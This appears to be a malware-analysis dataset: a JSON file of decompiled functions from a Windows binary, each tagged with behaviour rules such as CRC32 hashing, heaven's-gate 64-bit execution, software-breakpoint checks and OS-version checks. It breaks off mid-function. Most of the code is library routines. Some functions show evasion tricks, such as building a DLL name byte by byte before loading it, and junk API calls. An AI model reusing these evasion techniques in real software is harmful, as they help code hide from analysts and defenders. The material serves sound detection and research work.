{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404271": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404271(uint32_t arg_8h)\n\n{\n    fcn.0040424e();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404564();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00404625": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404625(uint32_t arg_8h)\n\n{\n    fcn.00404615();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404564();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "0040a303": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a303(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00405e53();\n    var_4h = 0;\n    if (*0x7fb9ac == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402bfc);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x402bf0);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x7fb9ac = fcn.00405de1(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x402be0);\n        *0x7fb9b0 = fcn.00405de1(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402bcc);\n        *0x7fb9b4 = fcn.00405de1(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402bb0);\n        *0x7fb9bc = fcn.00405de1(uVar3);\n        if (*0x7fb9bc != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x402b98);\n            *0x7fb9b8 = fcn.00405de1(uVar3);\n        }\n    }\n    if ((*0x7fb9b8 != iVar1) && (*0x7fb9bc != iVar1)) {\n        pcVar4 = fcn.00405e5c(*0x7fb9b8);\n        pcVar5 = fcn.00405e5c(*0x7fb9bc);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040a445;\n        }\n    }\n    if ((((*0x7fb9b0 != iVar1) && (pcVar4 = fcn.00405e5c(*0x7fb9b0),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x7fb9b4 != iVar1 && (pcVar4 = fcn.00405e5c(*0x7fb9b4),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040a445:\n    pcVar4 = fcn.00405e5c(*0x7fb9ac);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 858
    },
    "0040c1ae": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c1ae(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7f9b70 ^ &stack0xfffffffc;\n    fcn.004043f7(arg_10h);\n    var_14h = fcn.0040d199(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c711(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c207:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c247;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c239:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c247;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c239;\n        goto code_r0x0040c207;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c247:\n    fcn.00409930(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "0040c256": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c256(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7f9b70 ^ &stack0xfffffffc;\n    fcn.004043f7(arg_10h);\n    var_14h = fcn.0040d199(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040cc55(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c2af:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c2ef;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c2e1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c2ef;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c2e1;\n        goto code_r0x0040c2af;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c2ef:\n    fcn.00409930(unaff_EBX);\n    return;\n}\n",
        "token_count": 513
    },
    "0040d199": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d45b)\n// WARNING: Removing unreachable block (ram,0x0040d424)\n// WARNING: Removing unreachable block (ram,0x0040d80c)\n// WARNING: Removing unreachable block (ram,0x0040d433)\n// WARNING: Removing unreachable block (ram,0x0040d43b)\n// WARNING: Removing unreachable block (ram,0x0040d441)\n// WARNING: Removing unreachable block (ram,0x0040d444)\n// WARNING: Removing unreachable block (ram,0x0040d44b)\n// WARNING: Removing unreachable block (ram,0x0040d455)\n// WARNING: Removing unreachable block (ram,0x0040d4b0)\n// WARNING: Removing unreachable block (ram,0x0040d4aa)\n// WARNING: Removing unreachable block (ram,0x0040d4b6)\n// WARNING: Removing unreachable block (ram,0x0040d4d3)\n// WARNING: Removing unreachable block (ram,0x0040d4d5)\n// WARNING: Removing unreachable block (ram,0x0040d4dd)\n// WARNING: Removing unreachable block (ram,0x0040d4e0)\n// WARNING: Removing unreachable block (ram,0x0040d4e5)\n// WARNING: Removing unreachable block (ram,0x0040d4e8)\n// WARNING: Removing unreachable block (ram,0x0040d815)\n// WARNING: Removing unreachable block (ram,0x0040d4f3)\n// WARNING: Removing unreachable block (ram,0x0040d82c)\n// WARNING: Removing unreachable block (ram,0x0040d833)\n// WARNING: Removing unreachable block (ram,0x0040d4fe)\n// WARNING: Removing unreachable block (ram,0x0040d511)\n// WARNING: Removing unreachable block (ram,0x0040d513)\n// WARNING: Removing unreachable block (ram,0x0040d520)\n// WARNING: Removing unreachable block (ram,0x0040d525)\n// WARNING: Removing unreachable block (ram,0x0040d52b)\n// WARNING: Removing unreachable block (ram,0x0040d534)\n// WARNING: Removing unreachable block (ram,0x0040d53b)\n// WARNING: Removing unreachable block (ram,0x0040d553)\n// WARNING: Removing unreachable block (ram,0x0040d564)\n// WARNING: Removing unreachable block (ram,0x0040d572)\n// WARNING: Removing unreachable block (ram,0x0040d5b1)\n// WARNING: Removing unreachable block (ram,0x0040d5ba)\n// WARNING: Removing unreachable block (ram,0x0040d7d2)\n// WARNING: Removing unreachable block (ram,0x0040d5c8)\n// WARNING: Removing unreachable block (ram,0x0040d5d2)\n// WARNING: Removing unreachable block (ram,0x0040d7ed)\n// WARNING: Removing unreachable block (ram,0x0040d5df)\n// WARNING: Removing unreachable block (ram,0x0040d5e6)\n// WARNING: Removing unreachable block (ram,0x0040d5f0)\n// WARNING: Removing unreachable block (ram,0x0040d5f5)\n// WARNING: Removing unreachable block (ram,0x0040d605)\n// WARNING: Removing unreachable block (ram,0x0040d60a)\n// WARNING: Removing unreachable block (ram,0x0040d614)\n// WARNING: Removing unreachable block (ram,0x0040d619)\n// WARNING: Removing unreachable block (ram,0x0040d62b)\n// WARNING: Removing unreachable block (ram,0x0040d638)\n// WARNING: Removing unreachable block (ram,0x0040d647)\n// WARNING: Removing unreachable block (ram,0x0040d654)\n// WARNING: Removing unreachable block (ram,0x0040d671)\n// WARNING: Removing unreachable block (ram,0x0040d675)\n// WARNING: Removing unreachable block (ram,0x0040d67c)\n// WARNING: Removing unreachable block (ram,0x0040d685)\n// WARNING: Removing unreachable block (ram,0x0040d688)\n// WARNING: Removing unreachable block (ram,0x0040d699)\n// WARNING: Removing unreachable block (ram,0x0040d6a7)\n// WARNING: Removing unreachable block (ram,0x0040d6b2)\n// WARNING: Removing unreachable block (ram,0x0040d6b9)\n// WARNING: Removing unreachable block (ram,0x0040d6e4)\n// WARNING: Removing unreachable block (ram,0x0040d6e9)\n// WARNING: Removing unreachable block (ram,0x0040d6f4)\n// WARNING: Removing unreachable block (ram,0x0040d6fd)\n// WARNING: Removing unreachable block (ram,0x0040d703)\n// WARNING: Removing unreachable block (ram,0x0040d706)\n// WARNING: Removing unreachable block (ram,0x0040d72c)\n// WARNING: Removing unreachable block (ram,0x0040d731)\n// WARNING: Removing unreachable block (ram,0x0040d736)\n// WARNING: Removing unreachable block (ram,0x0040d743)\n// WARNING: Removing unreachable block (ram,0x0040d754)\n// WARNING: Removing unreachable block (ram,0x0040d785)\n// WARNING: Removing unreachable block (ram,0x0040d75a)\n// WARNING: Removing unreachable block (ram,0x0040d780)\n// WARNING: Removing unreachable block (ram,0x0040d764)\n// WARNING: Removing unreachable block (ram,0x0040d77a)\n// WARNING: Removing unreachable block (ram,0x0040d773)\n// WARNING: Removing unreachable block (ram,0x0040d788)\n// WARNING: Removing unreachable block (ram,0x0040d7b5)\n// WARNING: Removing unreachable block (ram,0x0040d792)\n// WARNING: Removing unreachable block (ram,0x0040d61d)\n// WARNING: Removing unreachable block (ram,0x0040d5fa)\n// WARNING: Removing unreachable block (ram,0x0040d7f0)\n// WARNING: Removing unreachable block (ram,0x0040d536)\n// WARNING: Removing unreachable block (ram,0x0040d7fa)\n// WARNING: Removing unreachable block (ram,0x0040d83b)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040d199(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.004063f8();\n        *puVar2 = 0x16;\n        fcn.004069d2(0, 0, 0, 0, 0);\n        fcn.00409930(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040d22c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40d861\n    (**0x40d861)();\n    return;\n}\n",
        "token_count": 1897
    },
    "00402ff0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00402ff0(void)\n\n{\n    *0x2f527f2 = 0x6c;\n    *0x2f527e6 = 0x6d;\n    *0x2f527e4 = 0x69;\n    *0x2f527e8 = 0x67;\n    *0x2f527f0 = 100;\n    *0x2f527f6 = 0;\n    *0x2f527ea = 0x33;\n    *0x2f527e2 = 0x73;\n    *0x2f527f4 = 0x6c;\n    *0x2f527ee = 0x2e;\n    *0x2f527ec = 0x32;\n    *0x2f527e0 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x2f527e0);\n    return;\n}\n",
        "token_count": 215
    },
    "004030a0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004030a0(uint param_1, uint32_t *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    if (*0x2f527dc == 3) {\n        (*_sym.imp.KERNEL32.dll_CreateMailslotA)(0, 0, 0, 0, param_1);\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(0, 0, 0, 0);\n    }\n    *param_2 = param_4 ^ param_3;\n    return;\n}\n",
        "token_count": 129
    },
    "0040c711": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c711(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040cc12;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040c846;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040c84d;\ncode_r0x0040c846:\n                        do {\n                            var_4h = 1;\ncode_r0x0040c84d:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040c85b;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040c85b:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x7f9dc4 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x7f9dc4 < iVar12) {\n                if (iVar12 < *0x7f9dc0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x7f9dc0;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040cc12;\n            }\n            var_10h = *0x7f9dc4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040c9fe;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040c9fe:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040cc12:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3680
    },
    "0040cc55": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cc55(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040d156;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x7f9de0 - 1;\n        iVar4 = *0x7f9de0 + (*0x7f9de0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x7f9de0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040cd8a;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040cd91;\ncode_r0x0040cd8a:\n                        do {\n                            var_4h = 1;\ncode_r0x0040cd91:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040cd9f;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040cd9f:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x7f9ddc - *0x7f9de0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x7f9ddc < iVar12) {\n                if (iVar12 < *0x7f9dd8) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x7f9dec;\n                    iVar4 = *0x7f9de4 + (*0x7f9de4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x7f9de4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    